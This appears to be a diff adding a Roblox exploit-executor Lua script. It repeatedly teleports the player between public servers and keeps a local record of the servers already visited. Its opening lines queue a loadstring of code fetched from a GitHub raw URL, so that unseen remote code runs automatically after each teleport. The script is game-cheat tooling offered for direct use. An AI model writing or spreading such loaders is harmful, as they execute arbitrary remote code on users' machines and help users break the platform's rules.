@@ -1,0 +1,101 @@
+queue_on_teleport([[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Scoobynooby01/trytingpickup/refs/heads/main/abc316324",true))()
+]])
+
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local currentPlaceId = game.PlaceId
+local visitedServers = {}
+local pageToken = nil
+local timeStamp = os.time()
+
+local function saveServerData()
+    local data = {
+        servers = visitedServers,
+        timestamp = timeStamp
+    }
+    writefile("visited_servers.json", HttpService:JSONEncode(data))
+end
+
+local function loadServerData()
+    local success, result = pcall(function()
+        return HttpService:JSONDecode(readfile("visited_servers.json"))
+    end)
+    
+    if success and result then
+        if os.time() - result.timestamp > 3600 then
+            visitedServers = {}
+            timeStamp = os.time()
+        else
+            visitedServers = result.servers or {}
+            timeStamp = result.timestamp
+        end
+    end
+end
+
+local function getServerList()
+    local url = "https://games.roblox.com/v1/games/" .. currentPlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
+    if pageToken then
+        url = url .. "&cursor=" .. pageToken
+    end
+    
+    local success, response = pcall(function()
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    
+    if success then
+        return response
+    end
+    return nil
+end
+
+local function findAvailableServer()
+    local serverData = getServerList()
+    if not serverData or not serverData.data then
+        return nil
+    end
+    
+    if serverData.nextPageCursor then
+        pageToken = serverData.nextPageCursor
+    end
+    
+    for _, server in pairs(serverData.data) do
+        local serverKey = tostring(server.id)
+        local hasSpace = (server.maxPlayers - server.playing) >= 1
+        local notVisited = true
+        
+        for _, visited in pairs(visitedServers) do
+            if visited == serverKey then
+                notVisited = false
+                break
+            end
+        end
+        
+        if hasSpace and notVisited and serverKey ~= game.JobId then
+            table.insert(visitedServers, serverKey)
+            return serverKey
+        end
+    end
+    
+    return nil
+end
+
+local function hopToServer()
+    loadServerData()
+    
+    local targetServer = findAvailableServer()
+    if targetServer then
+        saveServerData()
+        print("hello world")
+        wait(1)
+        TeleportService:TeleportToPlaceInstance(currentPlaceId, targetServer, player)
+    else
+        wait(5)
+        hopToServer()
+    end
+end
+
+hopToServer()
